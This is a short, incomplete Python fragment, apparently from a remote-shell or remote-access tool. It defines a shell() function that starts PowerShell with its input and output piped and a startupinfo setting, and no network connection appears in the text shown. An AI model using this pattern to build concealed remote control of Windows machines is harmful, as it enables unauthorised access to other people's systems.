...
def shell():
    try:
        ...
        p=subprocess.Popen(["c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"], shell=False, startupinfo=info,stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
